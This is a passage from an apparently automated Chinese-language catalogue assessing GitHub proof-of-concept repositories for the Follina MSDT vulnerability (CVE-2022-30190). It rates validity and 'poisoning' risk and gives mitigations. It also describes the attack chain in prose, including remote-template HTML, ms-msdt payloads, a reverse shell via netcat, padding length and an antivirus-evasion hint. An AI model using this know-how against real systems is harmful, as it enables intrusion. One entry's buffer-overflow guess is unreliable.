根据漏洞库信息和搜索结果，此漏洞真实存在且影响广泛。虽然提供的POC代码（README.md）本身不包含任何漏洞利用代码，但是搜索引擎结果表明该漏洞存在公开的POC，因此可以判断该漏洞是可利用的。

**投毒风险：**
提供的代码仓库只包含一个README.md文件，文件内容是关于Follina漏洞的利用、检测和缓解的说明，没有发现任何恶意代码。因此，直接从这个仓库判断是否存在投毒代码的可能性较低。但是，由于攻击者通常会修改POC代码以达到自己的目的，因此用户在使用互联网上找到的任何POC代码时，都需要保持警惕并进行安全审查，才能防止被植入恶意代码。

**利用方式：**
1.  攻击者创建一个恶意的文档，例如 Word 文档。
2.  该文档利用 Word 的远程模板功能，从攻击者控制的服务器上下载 HTML 文件。
3.  HTML 文件包含特定的 JavaScript 代码，该代码通过 `ms-msdt:/` 协议调用 MSDT。
4.  MSDT 接收到精心构造的参数后，会在受害者的机器上执行攻击者预先设定的恶意代码，从而实现远程代码执行。

**修复方案：**
*   及时更新Windows操作系统到最新版本。
*   禁用MSDT URL协议处理程序 (作为临时缓解措施)。
*   在 Defender 中添加规则阻止相关攻击。

**项目地址:** [RathoreAbhiii/Folina-Vulnerability-Exploitation-Detection-and-Mitigation](https://github.com/RathoreAbhiii/Folina-Vulnerability-Exploitation-Detection-and-Mitigation)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #14

**来源**: [CVE-2022-30190-ToxicEnvelope_FOLLINA-CVE-2022-30190.md](../2022/CVE-2022-30190-ToxicEnvelope_FOLLINA-CVE-2022-30190.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码。

**影响版本:** 受影响的Windows版本和版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开恶意构造的文档，例如Word文档。攻击者需要诱骗用户执行恶意操作。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，也被称为Follina，是一个影响Microsoft Windows Support Diagnostic Tool (MSDT)的远程代码执行漏洞。攻击者可以利用此漏洞，通过诱使用户打开包含恶意URL的文档（例如，利用Word远程模板功能）来执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的POC代码，该漏洞的POC代码是有效的。 搜索引擎结果中的多个链接（如hackthebox.com的解释、fortinet的分析以及qualys的博客等）证实了该漏洞的存在和可利用性。POC代码（`exploit.py`）提供了一种生成恶意Word文档，并通过HTTP服务器提供恶意HTML有效载荷的方法，从而利用MSDT执行任意命令。

**投毒风险：**

虽然POC代码的主要功能是生成漏洞利用程序，但存在一定的投毒风险。风险分析如下：

*   **依赖性：**  `exploit.py`脚本依赖于外部资源（HTTP服务器），如果攻击者控制了该服务器，则可以修改返回的HTML内容，从而在目标系统上执行恶意代码。 
*   **自定义命令执行：**  该脚本允许用户自定义要在目标系统上执行的命令 (`--command`参数)。攻击者可以通过精心构造的命令来执行恶意操作，例如下载和执行额外的恶意软件。
*  **Reverse Shell：** `--reverse` 参数会下载 netcat 到目标机器，虽然功能上为了利用，但也可能被滥用。
*   **代码可读性：**  虽然代码本身看起来没有明显的恶意后门，但是代码相对复杂，可能隐藏着一些不易察觉的恶意逻辑。

综合来看，虽然没有明显的投毒代码，但该工具的灵活性和对外部资源的依赖性使其存在一定的投毒风险，估计为10%。

**利用方式：**

1.  **攻击者准备恶意Word文档：**  攻击者使用`exploit.py`脚本生成一个包含恶意URL的Word文档。该URL指向攻击者控制的HTTP服务器。
2.  **攻击者搭建HTTP服务器：**  攻击者在自己的服务器上搭建一个HTTP服务器，用于托管恶意HTML有效载荷。
3.  **诱骗用户打开恶意文档：**  攻击者通过电子邮件、社交媒体或其他方式诱骗用户打开恶意Word文档。
4.  **MSDT被调用并执行恶意代码：**  当用户打开文档时，Word会尝试通过URL协议调用MSDT。MSDT会从攻击者的服务器下载恶意HTML，并执行其中的代码，从而实现远程代码执行。
5.  **攻击者控制目标系统：**  成功利用漏洞后，攻击者可以获得目标系统的控制权，并执行任意操作，例如安装恶意软件、窃取数据或创建新账户。

**项目地址:** [ToxicEnvelope/FOLLINA-CVE-2022-30190](https://github.com/ToxicEnvelope/FOLLINA-CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #15

**来源**: [CVE-2022-30190-Zitchev_go_follina.md](../2022/CVE-2022-30190-Zitchev_go_follina.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以利用此漏洞在受害者系统上执行任意代码，完全控制受害者系统。

**影响版本:** 受影响的版本包括Windows 7到Windows 11和Windows Server的多个版本，具体参见漏洞库信息。

**利用条件:** 需要用户打开恶意的Office文档（如Word）或访问包含恶意代码的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于Microsoft支持诊断工具（MSDT）中的远程代码执行漏洞。攻击者可以诱骗用户打开包含恶意链接或嵌入对象的Office文档（例如Word文档）。当用户打开恶意文档时，MSDT会尝试通过URL协议连接到攻击者控制的远程服务器。该服务器会提供一个包含恶意代码的HTML文件。这个HTML文件利用`ms-msdt:`协议触发MSDT执行任意代码。\n\n**利用方式分析：**\n
1.  **攻击者准备：** 攻击者需要搭建一个HTTP服务器，用于托管恶意payload。同时，攻击者需要创建一个恶意的Office文档，该文档包含一个指向攻击者服务器上HTML payload的链接。
2.  **诱骗受害者：** 攻击者通过电子邮件、社交媒体或其他方式将恶意Office文档发送给受害者。\n3.  **漏洞触发：** 受害者打开恶意Office文档。Word会尝试通过URL协议访问攻击者服务器上的HTML payload。\n4.  **代码执行：** HTML payload利用`ms-msdt:`协议，导致MSDT执行攻击者指定的命令。攻击者可以利用此漏洞安装恶意软件、窃取数据、创建新账户等。\n\n**代码分析：**\n
提供的Go代码是一个PoC，用于生成利用该漏洞的恶意docx文件。其主要步骤如下：

1.  `createMaliciousDocx` 函数：读取模板文件 `template/document.xml.rels.template`，将占位符 `{staged_html}` 替换为 payload 的 URL，然后将其写入 `template/doc/word/_rels/document.xml.rels`。接着调用 `zipDoc` 函数，将 `template/doc/` 目录下的所有文件打包成一个恶意的 docx 文件（tmp/file.docx）。
2.  `zipDoc` 函数：创建一个zip文件 (tmp/file.docx)，然后调用 `addFilesToArchive` 函数将 `template/doc/` 目录下的所有文件添加到该zip文件中。
3.  `addFilesToArchive` 函数：递归地将指定目录下的所有文件添加到zip文件中。
4.  `createPayload` 函数：生成包含恶意 ms-msdt 协议调用的 HTML payload。这个 payload 会使用 PowerShell 下载并执行攻击者指定的反向shell程序。
5.  `hostDropper` 函数：启动一个HTTP服务器，用于托管 payload.html 和反向shell程序 (poop.exe)。

**投毒风险分析：**\n
PoC 代码主要用于生成恶意的 docx 文件，核心在于生成包含恶意 `ms-msdt` 协议调用的 `payload.html` 文件。仔细检查代码，没有发现明显的恶意后门，但是存在以下几点潜在风险：

1.  **反向 Shell：**  代码中使用反向 shell。如果攻击者使用 PoC 生成恶意文件，他们可以完全控制受害者的计算机。PoC 本身不是后门，但容易被滥用。`revshellpath` 参数允许攻击者指定任意可执行文件，这为植入恶意软件提供了机会。
2.  **依赖性：** 此 PoC 依赖于模板文件 `template/document.xml.rels.template` 和指定的反向 shell 程序。如果这些文件被篡改，PoC 的行为可能会发生变化。在实际应用中，攻击者可以修改模板文件，例如嵌入其他的恶意代码。
3. **随机字符串生成器:** 代码中使用随机字符串来填充html，增加分析难度，也可能存在一定的随机性风险。

总体来说，此 PoC 存在一定的投毒风险，主要是由于反向 shell 的使用，以及对外部文件的依赖。但代码本身并不包含明显的恶意后门。 风险概率估计为 10%， 主要来自第三方恶意软件捆绑或者程序被篡改。

**项目地址:** [Zitchev/go_follina](https://github.com/Zitchev/go_follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #16

**来源**: [CVE-2022-30190-alien-keric_CVE-2022-30190.md](../2022/CVE-2022-30190-alien-keric_CVE-2022-30190.md)

## CVE-2022-30190 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，权限提升，数据泄露

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户需要打开恶意文档（例如Word），或者点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT)中的远程代码执行漏洞。该漏洞的利用方式如下：

1.  **攻击媒介：** 攻击者可以创建一个恶意的Microsoft Office文档（如Word），或者通过其他方式诱使用户点击一个特制的URL链接。
2.  **漏洞触发：** 当用户打开恶意文档或点击恶意链接时，MSDT会通过`ms-msdt:` URL协议被调用。
3.  **远程模板注入：** 恶意文档利用Word的远程模板功能，从远程服务器检索HTML文件。该HTML文件中包含恶意的JavaScript代码。
4.  **代码执行：** 嵌入在HTML中的JavaScript代码构造一个MSDT协议URL，该URL利用`PCWDiagnostic`参数来执行任意命令。
5.  **有效性：** 提供的Python脚本 `payload.py` 用于生成包含恶意命令的HTML payload。脚本首先将要执行的命令进行Base64编码，然后将其嵌入到一个特制的HTML脚本中，该脚本利用了`ms-msdt:` 协议。该POC代码看起来是有效的，可以生成利用此漏洞的payload。
6.  **投毒风险：** 提供的POC仓库主要包含生成Payload的脚本，脚本目的是使用Invoke-Expression执行base64编码的命令,虽然脚本本身没有明显的恶意代码，但存在以下投毒风险：
    * 依赖风险：Payload生成脚本依赖base64编码技术，攻击者有可能通过修改解码后的命令来实现恶意行为。
    * 载荷风险：Payload最终会执行PowerShell命令，这为执行恶意载荷提供了机会。攻击者可以嵌入各种恶意代码，如反向Shell、文件下载执行等。
    * 脚本来源风险： 虽然脚本声称来源于JohnHammond的GitHub仓库，但是有被篡改的风险，需要人工审核确认。
    因此，综合评估，该仓库中存在一定投毒风险, 估计占比10%。主要风险集中在使用者在使用payload时可能引入恶意代码。
7.  **缓解措施：**
    *   禁用MSDT URL协议。
    *   安装Microsoft提供的安全更新。
    *   使用威胁检测工具来识别和阻止利用此漏洞的攻击。

总体而言，CVE-2022-30190是一个严重的安全漏洞，攻击者可以利用它在受影响的系统上执行任意代码。用户应尽快采取措施来缓解此漏洞带来的风险。

**项目地址:** [alien-keric/CVE-2022-30190](https://github.com/alien-keric/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #17

**来源**: [CVE-2022-30190-aminetitrofine_CVE-2022-30190.md](../2022/CVE-2022-30190-aminetitrofine_CVE-2022-30190.md)

## CVE-2022-30190 (Follina) - Microsoft MSDT远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，获取系统控制权

**影响版本:** 受影响的Windows版本包括但不限于Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022，具体版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开包含恶意代码的Word文档或其他调用MSDT的应用程序。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个Microsoft MSDT远程代码执行漏洞。攻击者可以利用Word等应用程序通过URL协议调用MSDT来执行任意代码。漏洞利用过程大致如下：

1.  攻击者创建一个包含恶意链接的Word文档或其他支持URL协议调用MSDT的文档。
2.  当受害者打开该文档时，Word会尝试通过URL协议调用MSDT。
3.  恶意URL指向攻击者控制的服务器，服务器返回包含恶意代码的HTML页面。
4.  MSDT执行HTML页面中的恶意代码，从而实现远程代码执行。

根据提供的漏洞利用代码`follina.py`，该脚本可以生成包含恶意引用的Word文档，指向攻击者控制的HTTP服务器。HTTP服务器提供包含恶意代码的HTML文件，当受害者打开Word文档时，MSDT将执行此代码。

**有效性：** 提供的POC代码 `follina.py` 看起来有效，可以生成包含恶意代码的Word文档，并通过HTTP服务器提供payload。通过命令行参数可以指定要执行的命令（例如calc.exe或notepad.exe），或者获取反向shell。

**投毒风险：** `follina.py` 代码本身主要功能是利用漏洞，生成包含恶意代码的文档和提供payload。但值得注意的是，如果使用反向shell功能（`-r` 参数），代码会尝试从GitHub下载 `nc64.exe` (Netcat) 并将其放置在受害者系统的 `C:\Windows\Tasks` 目录下。这本身不是投毒行为，而是exploit的一部分，目的是为了建立反向连接。 但从Github下载的netcat二进制文件来源是否安全需要考虑，存在一定的供应链风险。仓库中的README.md文件描述中使用的下载链接也需要验证安全性。

综合考虑，认为该仓库存在一定程度的投毒风险，但主要来自于供应链风险和exploit本身行为引入的风险，而非作者恶意植入的后门，因此投毒风险评估为10%。

**利用方式：**

1.  **生成恶意文档：** 使用 `follina.py` 脚本生成包含恶意链接的Word文档（或其他支持的文档）。
2.  **搭建HTTP服务器：** 运行 `follina.py` 脚本会启动一个HTTP服务器，用于提供恶意HTML payload。
3.  **诱骗受害者打开文档：** 通过电子邮件、社交媒体或其他方式将恶意文档发送给受害者，诱骗其打开。
4.  **执行任意代码：** 受害者打开文档后，MSDT会执行HTTP服务器提供的恶意代码，从而实现远程代码执行。攻击者可以执行任意命令，安装恶意软件，窃取数据等。

**项目地址:** [aminetitrofine/CVE-2022-30190](https://github.com/aminetitrofine/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #18

**来源**: [CVE-2022-30190-ar2o3_FollinaXploit.md](../2022/CVE-2022-30190-ar2o3_FollinaXploit.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，系统被完全控制

**影响版本:** 受影响的Windows版本范围广泛，包括Windows 7至Windows 11及多个Server版本，详见漏洞库信息。

**利用条件:** 用户需要打开包含恶意链接或文档（如Word文档）的应用程序。攻击依赖于MSDT通过URL协议被调用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过精心构造的恶意文档，诱使用户打开，该文档利用Word的远程模板功能从远程服务器检索HTML文件，通过MSDT协议执行任意代码。该漏洞的利用方式是：

1.  **攻击者创建一个恶意的Word文档或其他支持远程模板的文档。**
2.  **该文档包含一个指向恶意服务器的链接，用于下载一个HTML文件。**
3.  **当用户打开该文档时，Word会尝试从远程服务器下载HTML文件。**
4.  **HTML文件包含恶意的JavaScript代码，该代码使用`ms-msdt:`协议调用MSDT，并执行任意命令。**
5.  **攻击者利用MSDT的漏洞执行系统命令，实现远程代码执行。**

**有效性评估：**
根据漏洞库信息和搜索结果，此漏洞利用的有效性较高，已被积极利用。

**投毒风险：**
提供的漏洞利用代码只包含GNU GPL协议的许可证，属于开源协议声明，不具备实际的漏洞利用代码。无法直接用于评估是否存在后门或恶意代码。但考虑到实际漏洞利用中可能存在复杂的攻击链，且攻击者可能修改或添加额外的恶意代码，仍然存在一定的投毒风险。此处预估投毒风险为10%，主要考虑实际利用中攻击者可能的定制行为。

**搜索引擎结果补充：** 搜索引擎结果中提到漏洞利用需要调用URL协议和MSDT。同时，参考 Qualys 的博客，表明此漏洞影响范围广泛。Arctic Wolf的博客也指出此漏洞已经被积极利用。这些都增加了漏洞利用的有效性评估。


**项目地址:** [ar2o3/FollinaXploit](https://github.com/ar2o3/FollinaXploit)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #19

**来源**: [CVE-2022-30190-arozx_CVE-2022-30190.md](../2022/CVE-2022-30190-arozx_CVE-2022-30190.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 见漏洞库信息中的受影响版本列表

**利用条件:** 用户需要打开恶意Word文档或点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190 (Follina) 是一个 Microsoft Office 漏洞，当从 Word 等调用应用程序中使用 URL 协议调用 MSDT 时，存在远程代码执行漏洞。攻击者可以利用此漏洞在受害者系统上执行任意代码。根据提供的PoC代码，攻击方式主要通过构造恶意的HTML文件（exploit.html），该文件包含大量的 'A' 字符，可能用于缓冲区溢出或其他内存破坏技术，从而执行恶意代码。该HTML文件需要通过Word的远程模板功能从远程服务器检索。server.py脚本可能用于托管该恶意HTML文件。漏洞利用有效性较高，因为该漏洞已被公开利用并添加到 CISA KEV 目录。投毒风险评估为10%。因为攻击者可能通过服务器端植入后门，但是该后门不是通过PoC直接表现，需要攻击者自身行为才能形成。 

**利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意HTML的Word文档。
2.  当用户打开该文档时，Word会尝试通过MSDT URL协议加载远程HTML文件。
3.  恶意HTML文件利用MSDT漏洞执行任意代码，例如下载并执行恶意程序，或直接在受害者系统上执行命令。

**项目地址:** [arozx/CVE-2022-30190](https://github.com/arozx/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #20

**来源**: [CVE-2022-30190-drgreenthumb93_CVE-2022-30190-follina.md](../2022/CVE-2022-30190-drgreenthumb93_CVE-2022-30190-follina.md)

## CVE-2022-30190-Follina

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许远程代码执行，可完全控制受害者系统

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序（如Word），需要用户交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过诱使用户打开恶意构造的Word文档或其他支持URL协议的应用程序来利用此漏洞。该文档会利用Word的远程模板功能从远程Web服务器检索HTML文件，HTML文件中包含恶意的JavaScript代码。该JavaScript代码使用`ms-msdt:` URL协议调用MSDT，并传递恶意的命令参数，导致MSDT执行任意代码。PoC代码通过修改`word\rels\document.xml.rels`文件中的目标IP来指定恶意HTML文件的位置。`bad.html`文件包含大量的填充字符，之后是恶意JavaScript代码。攻击者需要确保在`window.location.href`之前至少有3541个字符，并且这些字符必须在`<script>`标签内。PoC的README提到Windows Defender可能会检测到此漏洞（Trojan:Win32/Mesdetty.D），因此可能需要编辑PoC文件以绕过检测。根据提供的代码和信息，没有发现作者有意添加的投毒代码。

**项目地址:** [drgreenthumb93/CVE-2022-30190-follina](https://github.com/drgreenthumb93/CVE-2022-30190-follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #21

**来源**: [CVE-2022-30190-ethicalblue_Follina-CVE-2022-30190-Sample.md](../2022/CVE-2022-30190-ethicalblue_Follina-CVE-2022-30190-Sample.md)

## CVE-2022-30190 - Microsoft MSDT "Follina" RCE

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的多个Windows版本，详见漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文件的应用程序（例如Word）。攻击通常通过诱骗用户打开恶意文档触发。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190，又名"Follina"，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。该漏洞允许攻击者通过MSDT URL协议，从调用应用程序（如Microsoft Word）执行任意代码。攻击者通常会制作恶意的Word文档或RTF文件，其中包含指向恶意HTML文件的链接。当用户打开文档时，Word会通过MSDT协议加载HTML文件，从而导致恶意代码执行。

**漏洞利用方式：**

1.  **诱骗用户打开恶意文档：** 攻击者通过电子邮件、网络钓鱼或其他方式，诱骗用户打开特制的Word文档或RTF文件。
2.  **文档包含恶意链接：** 该文档包含一个指向远程服务器上托管的恶意HTML文件的链接，通常使用`ms-msdt:/`协议触发。
3.  **利用MSDT执行代码：** 当Word尝试打开链接时，会调用MSDT，并执行HTML文件中嵌入的恶意代码，最终实现远程代码执行。

**POC分析：**

提供的POC代码包含以下文件：

*   `App.xaml` 和 `App.xaml.cs`: 定义WPF应用程序的入口点和资源。
*   `AssemblyInfo.cs`: 包含程序集的元数据，例如主题信息。
*   `FollinaExtractor.cs`:  包含用于从受感染的Word文档（.docx）或RTF文件中提取恶意链接的代码。它解析`word/_rels/document.xml.rels`文件以查找`Target="mhtml:`开头的字符串，或RTF文件寻找恶意链接，从而提取恶意MHTML链接。
*   `Follina_PoC.csproj`:  定义项目设置，例如目标框架和使用的WPF。

此POC代码用于分析和提取Follina漏洞相关的恶意URL，不包含直接执行恶意代码的部分，是一个分析工具。

**投毒风险评估：**

此仓库的主要功能是提取已知的漏洞利用代码。通过检查`FollinaExtractor.cs`，我们可以确定它主要用于读取文件内容并搜索特定的字符串模式。因此，该仓库的作者可以通过隐藏在不太明显的地方的代码（例如，通过引入额外的库或修改现有的解析逻辑），在提取过程中执行一些额外的操作（例如，记录提取的URL，收集系统信息等）。但是，由于其主要功能是分析文件，因此恶意代码的插入点有限。投毒风险较低。
基于漏洞利用代码的分析，我们认为该仓库存在投毒风险的可能性为5%。大部分代码都是标准WPF应用程序结构和字符串解析功能。

**项目地址:** [ethicalblue/Follina-CVE-2022-30190-Sample](https://github.com/ethicalblue/Follina-CVE-2022-30190-Sample)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #22

**来源**: [CVE-2022-30190-hycheng15_CVE-2022-30190.md](../2022/CVE-2022-30190-hycheng15_CVE-2022-30190.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本包括Windows 7 SP1到Windows 11 21H2，具体版本范围见漏洞库信息。

**利用条件:** 用户需要打开恶意的Word文档。攻击者需要能够托管一个HTTP服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞 (CVE-2022-30190)，又名Follina，是由于MSDT处理URL协议不当造成的远程代码执行漏洞。攻击者可以构造一个恶意的Word文档，其中包含指向远程HTTP服务器的链接。当用户打开文档时，Word会使用MSDT通过URL协议去请求远程HTML文件。这个HTML文件包含恶意的JavaScript代码，用于执行任意命令。

**有效性：** 提供的POC代码是有效的。该代码通过以下步骤利用漏洞：

1.  创建一个恶意的Word文档，其中包含指向攻击者控制的HTTP服务器的链接。
2.  托管一个HTTP服务器，该服务器提供包含恶意JavaScript代码的HTML文件。
3.  当受害者打开Word文档时，MSDT会尝试连接到攻击者的服务器并执行恶意代码。

**投毒风险：** 存在一定的投毒风险 (10%)。

*   `folina.py`脚本本身看起来是合法的漏洞利用代码，但需要仔细检查其依赖项和网络行为。
*   虽然主要功能集中在生成漏洞利用文件和搭建HTTP服务，但仍需审查脚本中是否存在任何潜在的恶意行为，例如未记录的数据传输或额外的文件操作。
*  脚本中从github下载`nc64.exe`，如果github上的文件被替换为恶意程序，则存在被投毒风险。

**利用方式：**

1.  攻击者创建一个恶意的Word文档 (`follina.doc`)，其中包含指向远程服务器上托管的HTML文件的链接。
2.  攻击者搭建一个HTTP服务器，托管包含恶意JavaScript代码的HTML文件 (`index.html`)。这个HTML文件使用`ms-msdt:`协议触发MSDT，并执行payload。
3.  攻击者诱骗受害者打开恶意的Word文档。
4.  Word文档加载远程HTML文件，触发MSDT，从而在受害者系统上执行任意代码。

POC代码使用python编写，主要步骤如下：

*   **环境准备:**
    *   搭建Windows虚拟机(推荐Win10 21H2)，并安装Microsoft Word 2013及Python 3.8.10。
    *   关闭Windows的病毒和威胁防护。
    *   使用`pip install netifaces`安装依赖。
*   **漏洞利用：**
    *   运行`folina.py`脚本，指定监听IP地址和端口。示例：`py folina.py -i <ip-address>`
    *   脚本会生成一个恶意的Word文档 (follina.doc)，并在指定的IP地址和端口上启动一个HTTP服务器。
    *   诱骗目标用户打开该Word文档，即可触发漏洞，执行计算器程序或反弹shell。

**项目地址:** [hycheng15/CVE-2022-30190](https://github.com/hycheng15/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #23

**来源**: [CVE-2022-30190-komomon_CVE-2022-30190-follina-Office-MSDT-Fixed.md](../2022/CVE-2022-30190-komomon_CVE-2022-30190-follina-Office-MSDT-Fixed.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，安装程序，查看、更改或删除数据，或在用户权限允许的上下文中创建新帐户

**影响版本:** 受影响的Windows版本：Windows 7 SP1, Windows 8.1, Windows Server 2008 R2 SP1, Windows Server 2012, Windows Server 2012 R2, Windows 10 (所有版本), Windows 11, Windows Server 2016, Windows Server 2019, Windows Server 2022。 具体版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开恶意的Word文档或其他调用MSDT的应用程序。攻击者需要诱骗用户执行恶意操作。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞。攻击者可以通过构造恶意的Word文档或其他调用MSDT的应用程序，利用URL协议调用MSDT来执行任意代码。该漏洞的利用方式是，恶意文档利用Word的远程模板功能从远程web服务器检索HTML文件，该HTML文件包含执行恶意代码的指令。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意链接的Word文档或其他可以调用MSDT的应用程序。
2.  该恶意链接指向攻击者控制的服务器，该服务器托管一个包含恶意代码的HTML文件。
3.  当受害者打开文档时，Word会尝试从远程服务器加载HTML文件。
4.  HTML文件利用ms-msdt协议触发MSDT，从而执行嵌入的恶意代码。
5.  恶意代码在受害者的计算机上执行，赋予攻击者控制受害者系统的能力。

**投毒风险分析：**

提供的Python POC代码主要功能是生成包含漏洞利用的恶意Word文档。 代码通过修改docx文档的`word/_rels/document.xml.rels`文件，将文档中的链接重定向到恶意服务器。  此外，代码还会修改`word/document.xml`添加OLEObject。

虽然代码本身实现了漏洞利用，但潜在的投毒风险主要在于以下几个方面：

*   **恶意服务器：**  POC代码依赖于攻击者控制的服务器来托管payload。 如果攻击者在服务器端放置了更具破坏性的payload，例如勒索软件或其他恶意软件，则利用此POC的用户可能会意外地分发这些恶意软件。
*   **生成的文档：**  生成的docx文档本身就是恶意文件。如果用户不小心将包含后门的恶意文档分享给其他人，可能会造成进一步的危害，但这不是代码投毒，而是漏洞本身的利用效果。

代码中直接包含恶意后门的概率较低，但用户需要警惕使用该POC可能带来的间接风险，尤其是payload服务器的安全性。 此处将投毒概率评估为10%，主要考虑的是payload服务器被恶意利用的可能性，而非代码本身存在后门。

**项目地址:** [komomon/CVE-2022-30190-follina-Office-MSDT-Fixed](https://github.com/komomon/CVE-2022-30190-follina-Office-MSDT-Fixed)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #24

**来源**: [CVE-2022-30190-mattjmillner_CVE-Smackdown.md](../2022/CVE-2022-30190-mattjmillner_CVE-Smackdown.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本（见漏洞库信息）

**利用条件:** 需要用户打开恶意文档（例如Word文档）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中。攻击者可以利用该漏洞通过调用应用程序(例如Microsoft Word)以URL协议的方式执行任意代码。攻击者通常会创建一个恶意的Word文档，该文档利用Word的远程模板功能从远程Web服务器检索一个HTML文件，该HTML文件包含恶意代码，从而触发MSDT执行任意命令。

**有效性:**
根据搜索结果，该漏洞是真实存在的，并且已被积极利用。漏洞库信息和搜索结果都确认了其存在和影响。

**投毒风险:**
提供的POC代码 `/tmp/64676d48ed786b898eab15332ce05bd0/README.md`  仅仅包含一个README.md文件，其中写着“Hello this is where we will conduct nefarious activities”。
这本身不是利用代码，而只是一个占位符。
因此，直接从这个`README.md`文件判断投毒是不可能的。该仓库如果包含其他恶意利用载荷则具有投毒可能。
